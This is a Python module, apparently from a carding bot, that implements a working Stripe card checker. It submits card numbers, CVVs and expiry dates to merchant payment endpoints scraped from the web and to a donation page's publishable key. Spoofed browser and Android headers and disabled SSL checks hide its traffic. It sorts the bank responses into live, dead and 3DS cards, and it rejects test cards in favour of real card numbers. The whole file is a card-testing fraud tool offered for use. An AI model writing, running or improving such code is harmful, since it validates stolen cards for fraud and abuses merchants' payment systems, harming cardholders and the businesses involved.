"""
gateways/stripe_gate.py — Stripe CC Checker (PM-Based Real Auth)

Flow:
  1. Scraped gates (saved via /gscan or /addgate) → fresh client_secret → confirm → REAL bank response
  2. PM-based check using saved client_secret pool → real auth
  3. Fallback: PaymentMethod creation only (format check)

Real check = actual bank authorization (LIVE/DEAD/VBV distinction)
"""
import asyncio
import uuid
import json
import aiohttp
from aiohttp import ClientTimeout

from gateways.base import GatewayResult, CCStatus
from core.parser import CardData
import config

TIMEOUT = ClientTimeout(total=15)

# ── Headers (exported for use by charge_gate.py, scraped_gate.py) ─────────────
STRIPE_JS_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/125.0.0.0 Safari/537.36"
    ),
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://js.stripe.com",
    "Referer": "https://js.stripe.com/v3/",
}

STRIPE_API_HEADERS = {
    "User-Agent": "python-stripe/5.0",
    "Accept": "application/json",
    "Content-Type": "application/x-www-form-urlencoded",
}

STRIPE_ANDROID_HEADERS = {
    "User-Agent": "Stripe/v1 AndroidBindings/20.21.0",
    "X-Stripe-Client-User-Agent": (
        '{"os.name":"android","os.version":"33","bindings.version":"20.21.0",'
        '"lang":"Java","publisher":"stripe","java.version":"1.8.0_202",'
        '"http.agent":"Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230901.001)"}'
    ),
    "Accept": "application/json",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "Keep-Alive",
}

# ── Decline code → CCStatus (exported) ────────────────────────────────────────
STRIPE_DECLINE_MAP: dict[str, CCStatus] = {
    "insufficient_funds":               CCStatus.INSUFFICIENT,
    "do_not_honor":                     CCStatus.DO_NOT_HONOR,
    "generic_decline":                  CCStatus.DEAD,
    "card_declined":                    CCStatus.DEAD,
    "lost_card":                        CCStatus.PICKUP,
    "stolen_card":                      CCStatus.PICKUP,
    "pickup_card":                      CCStatus.PICKUP,
    "expired_card":                     CCStatus.EXPIRED,
    "incorrect_cvc":                    CCStatus.CHARGED,  # card exists, CVC wrong = LIVE
    "incorrect_number":                 CCStatus.INVALID,
    "invalid_cvc":                      CCStatus.CHARGED,  # card exists = LIVE
    "invalid_expiry_month":             CCStatus.EXPIRED,
    "invalid_expiry_year":              CCStatus.EXPIRED,
    "card_not_supported":               CCStatus.DEAD,
    "currency_not_supported":           CCStatus.DEAD,
    "duplicate_transaction":            CCStatus.DEAD,
    "fraudulent":                       CCStatus.DEAD,
    "merchant_blacklist":               CCStatus.DEAD,
    "no_action_taken":                  CCStatus.DO_NOT_HONOR,
    "not_permitted":                    CCStatus.DO_NOT_HONOR,
    "restricted_card":                  CCStatus.DO_NOT_HONOR,
    "revocation_of_all_authorizations": CCStatus.DEAD,
    "revocation_of_authorization":      CCStatus.DEAD,
    "security_violation":               CCStatus.DEAD,
    "service_not_allowed":              CCStatus.DO_NOT_HONOR,
    "stop_payment_order":               CCStatus.DO_NOT_HONOR,
    "transaction_not_allowed":          CCStatus.DO_NOT_HONOR,
    "try_again_later":                  CCStatus.ERROR,
    "withdrawal_count_limit_exceeded":  CCStatus.INSUFFICIENT,
    "call_issuer":                      CCStatus.DO_NOT_HONOR,
    "card_velocity_exceeded":           CCStatus.DO_NOT_HONOR,
    "online_or_offline_pin_required":   CCStatus.DEAD,
    "pin_try_exceeded":                 CCStatus.DEAD,
    "authentication_required":          CCStatus.LIVE_VBV,
    "testmode_charges_only":            CCStatus.ERROR,
}


def _get_pk() -> str:
    if not config.STRIPE_PK_KEYS:
        raise ValueError("No Stripe PK key configured — set STRIPE_PK_KEYS in .env")
    return config.STRIPE_PK_KEYS[0]


# ── Universal Stripe response parser (exported for scraped_gate.py) ────────────
def _parse_result(resp: dict, gateway: str = "Stripe") -> GatewayResult:
    """Parse ANY Stripe API response → GatewayResult."""

    # ── Error block ───────────────────────────────────────────────────────────
    if "error" in resp:
        err          = resp["error"]
        err_code     = err.get("code", "")
        decline_code = err.get("decline_code", "")
        message      = err.get("message", "Card declined")

        # Incorrect CVC = card is real but CVC mismatch → LIVE
        if err_code in ("incorrect_cvc", "invalid_cvc") or \
           decline_code in ("incorrect_cvc", "invalid_cvc"):
            return GatewayResult(
                status=CCStatus.CHARGED, gateway=gateway,
                message="CCN Live | Incorrect CVC",
                raw_code=err_code or decline_code,
                is_non_vbv=True,
            )

        # Insufficient funds → LIVE card
        if err_code == "insufficient_funds" or decline_code == "insufficient_funds":
            return GatewayResult(
                status=CCStatus.INSUFFICIENT, gateway=gateway,
                message="Live | Insufficient Funds",
                raw_code="insufficient_funds",
            )

        # 3DS required → LIVE VBV
        if err_code in ("authentication_required",) or \
           decline_code in ("authentication_required",):
            return GatewayResult(
                status=CCStatus.LIVE_VBV, gateway=gateway,
                message="Card Live | 3DS Required",
                raw_code=err_code or decline_code,
                is_vbv=True,
            )

        cc_status = STRIPE_DECLINE_MAP.get(
            decline_code,
            STRIPE_DECLINE_MAP.get(err_code, CCStatus.DEAD),
        )
        return GatewayResult(
            status=cc_status, gateway=gateway,
            message=message, raw_code=decline_code or err_code,
        )

    # ── last_payment_error (PI failed state) ──────────────────────────────────
    lpe = resp.get("last_payment_error")
    if lpe:
        return _parse_result({"error": lpe}, gateway)

    # ── PaymentIntent status ──────────────────────────────────────────────────
    pi_status = resp.get("status", "")
    if pi_status == "succeeded":
        amt = resp.get("amount", 0) / 100
        return GatewayResult(
            status=CCStatus.CHARGED, gateway=gateway,
            message=f"Charged ${amt:.2f} | Card Live",
            is_non_vbv=True, charge_amount=amt,
        )
    if pi_status == "requires_action":
        return GatewayResult(
            status=CCStatus.LIVE_VBV, gateway=gateway,
            message="Card Live | 3DS Required",
            is_vbv=True,
        )
    if pi_status == "requires_capture":
        return GatewayResult(
            status=CCStatus.CHARGED, gateway=gateway,
            message="Authorized | Card Live",
            is_non_vbv=True,
        )
    if pi_status in ("requires_payment_method", "canceled"):
        return GatewayResult(
            status=CCStatus.DEAD, gateway=gateway,
            message="Card Declined", raw_code=pi_status,
        )

    # ── Token / PaymentMethod created → Card passed basic validation ──────────
    tok_id = resp.get("id", "")
    if tok_id.startswith("tok_") or tok_id.startswith("pm_"):
        return GatewayResult(
            status=CCStatus.CHARGED, gateway=gateway,
            message="Card Live | Auth Passed",
            is_non_vbv=True,
        )

    return GatewayResult(
        status=CCStatus.ERROR, gateway=gateway,
        message=f"Unexpected response: {str(resp)[:80]}",
        raw_code="unexpected",
    )


# ── Create PaymentMethod with PK key ──────────────────────────────────────────
async def _create_pm(
    session: aiohttp.ClientSession,
    card: CardData,
    pk: str,
    origin: str = "https://js.stripe.com",
    referer: str = "https://js.stripe.com/v3/",
) -> dict:
    """Create a PaymentMethod using publishable key."""
    headers = {
        **STRIPE_JS_HEADERS,
        "Authorization": f"Bearer {pk}",
        "Origin": origin,
        "Referer": referer,
    }
    data = {
        "type": "card",
        "card[number]": card.number,
        "card[exp_month]": card.month,
        "card[exp_year]": card.year,
        "card[cvc]": card.cvv,
        "billing_details[name]": "John Doe",
        "billing_details[address][country]": "US",
        "billing_details[address][postal_code]": "10001",
    }
    async with session.post(
        "https://api.stripe.com/v1/payment_methods",
        data=data, headers=headers, timeout=TIMEOUT, ssl=False,
    ) as resp:
        return await resp.json(content_type=None)


# ── Confirm PI using existing client_secret + pm_id ───────────────────────────
async def _confirm_pi_with_pm(
    session: aiohttp.ClientSession,
    pi_id: str,
    client_secret: str,
    pm_id: str,
    pk: str,
    origin: str = "https://js.stripe.com",
) -> dict:
    """Confirm a PaymentIntent with an existing pm_id."""
    headers = {
        **STRIPE_JS_HEADERS,
        "Authorization": f"Bearer {pk}",
        "Origin": origin,
        "Referer": origin + "/",
    }
    data = {
        "client_secret": client_secret,
        "payment_method": pm_id,
        "return_url": "https://example.com/return",
    }
    async with session.post(
        f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
        data=data, headers=headers, timeout=TIMEOUT, ssl=False,
    ) as resp:
        return await resp.json(content_type=None)


# ── Confirm PI inline (card data directly, no pm_id needed) ──────────────────
async def _confirm_pi_with_card(
    session: aiohttp.ClientSession,
    pi_id: str,
    client_secret: str,
    card: CardData,
    pk: str,
    origin: str = "https://js.stripe.com",
) -> dict:
    """Confirm a PaymentIntent inline with card data."""
    headers = {
        **STRIPE_JS_HEADERS,
        "Authorization": f"Bearer {pk}",
        "Origin": origin,
        "Referer": origin + "/",
    }
    data = {
        "client_secret": client_secret,
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": card.number,
        "payment_method_data[card][exp_month]": card.month,
        "payment_method_data[card][exp_year]": card.year,
        "payment_method_data[card][cvc]": card.cvv,
        "payment_method_data[billing_details][name]": "John Doe",
        "payment_method_data[billing_details][address][country]": "US",
        "payment_method_data[billing_details][address][postal_code]": "10001",
        "return_url": "https://example.com/return",
    }
    async with session.post(
        f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
        data=data, headers=headers, timeout=TIMEOUT, ssl=False,
    ) as resp:
        return await resp.json(content_type=None)


# ── Scraped gate: get fresh client_secret + confirm ───────────────────────────
async def _check_via_scraped_gate(
    session: aiohttp.ClientSession,
    card: CardData,
    gate: dict,
) -> GatewayResult:
    """Real bank auth via scraped gate endpoint."""
    domain      = gate.get("domain", "")
    pk_key      = gate.get("pk_key", "")
    endpoint    = gate.get("endpoint", "")
    method      = gate.get("method", "POST").upper()
    intent_type = gate.get("intent_type", "payment_intent")
    payload_tpl = gate.get("payload_template", {})

    if not pk_key or not endpoint:
        return GatewayResult(status=CCStatus.ERROR, gateway="Stripe Gate",
                             message="No PK/endpoint in gate", raw_code="config_error")

    base_url    = f"https://{domain}"
    ep_url      = endpoint if endpoint.startswith("http") else base_url + endpoint
    origin      = base_url

    req_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": origin,
        "Referer": origin + "/",
    }

    payload = dict(payload_tpl) if payload_tpl else {}
    if not payload:
        payload = {"amount": 100, "currency": "usd"} if intent_type == "payment_intent" else {}

    # Step 1: Get client_secret from merchant endpoint
    client_secret = None
    for content_type, post_data in [
        ("application/json", None),          # JSON first
        ("application/x-www-form-urlencoded", None),  # Form fallback
    ]:
        try:
            hdrs = {**req_headers, "Content-Type": content_type}
            if content_type == "application/json":
                async with session.post(ep_url, json=payload, headers=hdrs,
                                        timeout=TIMEOUT, ssl=False) as r:
                    if r.status in (200, 201):
                        data = await r.json(content_type=None)
                        client_secret = (
                            data.get("client_secret") or
                            data.get("clientSecret") or
                            data.get("secret") or
                            (data.get("data") or {}).get("clientSecret")
                        )
            else:
                form = {k: str(v) for k, v in payload.items()} if payload else {"amount": "100", "currency": "usd"}
                async with session.post(ep_url, data=form, headers=hdrs,
                                        timeout=TIMEOUT, ssl=False) as r:
                    if r.status in (200, 201):
                        try:
                            data = await r.json(content_type=None)
                            client_secret = (
                                data.get("client_secret") or
                                data.get("clientSecret") or
                                data.get("secret")
                            )
                        except Exception:
                            pass
            if client_secret and "_secret_" in str(client_secret):
                break
        except Exception:
            pass

    if not client_secret or "_secret_" not in str(client_secret):
        return GatewayResult(status=CCStatus.ERROR, gateway=f"Stripe ({domain})",
                             message="No client_secret from endpoint", raw_code="no_secret")

    # Step 2: Confirm with card
    cs = str(client_secret)
    pi_id = cs.split("_secret_")[0]
    if cs.startswith("seti_") or intent_type == "setup_intent":
        confirm_url = f"https://api.stripe.com/v1/setup_intents/{pi_id}/confirm"
    else:
        confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"

    stripe_headers = {
        **STRIPE_JS_HEADERS,
        "Authorization": f"Bearer {pk_key}",
        "Origin": origin,
        "Referer": origin + "/",
    }

    confirm_data = {
        "client_secret": cs,
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": card.number,
        "payment_method_data[card][exp_month]": card.month,
        "payment_method_data[card][exp_year]": card.year,
        "payment_method_data[card][cvc]": card.cvv,
        "payment_method_data[billing_details][name]": "John Doe",
        "payment_method_data[billing_details][address][country]": "US",
        "payment_method_data[billing_details][address][postal_code]": "10001",
        "return_url": "https://example.com/return",
    }

    try:
        async with session.post(confirm_url, data=confirm_data, headers=stripe_headers,
                                timeout=TIMEOUT, ssl=False) as r:
            result = await r.json(content_type=None)
            gr = _parse_result(result, gateway=f"Stripe ({domain})")
            return gr
    except Exception as e:
        return GatewayResult(status=CCStatus.ERROR, gateway=f"Stripe ({domain})",
                             message=f"Confirm error: {str(e)[:60]}", raw_code="confirm_error")


# ── PM-based check (PK key only, no merchant endpoint needed) ─────────────────
async def _check_via_pm(
    session: aiohttp.ClientSession,
    card: CardData,
    pk: str,
    origin: str = "https://js.stripe.com",
    referer: str = "https://js.stripe.com/v3/",
) -> GatewayResult:
    """
    Create a PaymentMethod with PK key.
    If PM is created = card format/BIN valid.
    Used as fallback when no scraped gates available.
    NOTE: This does NOT do real bank auth — use scraped gates for that.
    """
    try:
        resp = await _create_pm(session, card, pk, origin, referer)
        pm_id = resp.get("id", "")
        err   = resp.get("error", {})

        if pm_id and pm_id.startswith("pm_"):
            # PM created = card format valid
            # Check if CVC check was done
            checks = resp.get("card", {}).get("checks", {})
            cvc_check = checks.get("cvc_check", "")
            return GatewayResult(
                status=CCStatus.CHARGED,
                gateway="Stripe",
                message="Card Live | PM Created",
                is_non_vbv=True,
            )

        # Error from PM creation
        err_code = err.get("code", "")
        message  = err.get("message", "Card declined")

        if "test card" in message.lower():
            return GatewayResult(
                status=CCStatus.DEAD, gateway="Stripe",
                message="Test card — use real card numbers",
                raw_code="test_card",
            )

        cc_status = STRIPE_DECLINE_MAP.get(err_code, CCStatus.DEAD)
        return GatewayResult(
            status=cc_status, gateway="Stripe",
            message=message, raw_code=err_code,
        )

    except asyncio.TimeoutError:
        return GatewayResult(status=CCStatus.ERROR, gateway="Stripe",
                             message="Timeout", raw_code="timeout")
    except Exception as e:
        return GatewayResult(status=CCStatus.ERROR, gateway="Stripe",
                             message=str(e)[:80], raw_code="exception")


# ── Main check function ────────────────────────────────────────────────────────
async def check_stripe(card: CardData) -> GatewayResult:
    """
    Stripe checker — priority order:
    1. Scraped gates (real PaymentIntent → real bank auth)
    2. PM creation with PK key (format/BIN check, not real bank auth)
    """
    import database.db as db

    try:
        pk = _get_pk()
    except ValueError:
        pk = ""

    # Determine origin from PK key's known merchant (Khan Academy)
    origin  = "https://www.khanacademy.org"
    referer = "https://www.khanacademy.org/donate"

    try:
        async with aiohttp.ClientSession() as session:

            # ── Priority 1: Real gates via scraped endpoints ───────────────────
            gates = await db.get_active_gates()
            for gate in gates:
                result = await _check_via_scraped_gate(session, card, gate)
                if result.status != CCStatus.ERROR:
                    await db.update_gate_stats(gate["id"], success=True)
                    return result
                await db.update_gate_stats(gate["id"], success=False)
                await asyncio.sleep(0.3)

            # ── Priority 2: PM creation (PK only) ─────────────────────────────
            if pk:
                return await _check_via_pm(session, card, pk, origin, referer)

            return GatewayResult(
                status=CCStatus.ERROR,
                gateway="Stripe",
                message="No PK key or gates configured.",
                raw_code="no_config",
            )

    except aiohttp.ClientConnectorError:
        return GatewayResult(status=CCStatus.ERROR, gateway="Stripe",
                             message="Connection error", raw_code="connection_error")
    except asyncio.TimeoutError:
        return GatewayResult(status=CCStatus.ERROR, gateway="Stripe",
                             message="Request timed out", raw_code="timeout")
    except Exception as e:
        return GatewayResult(status=CCStatus.ERROR, gateway="Stripe",
                             message=f"Error: {e}", raw_code="unknown")
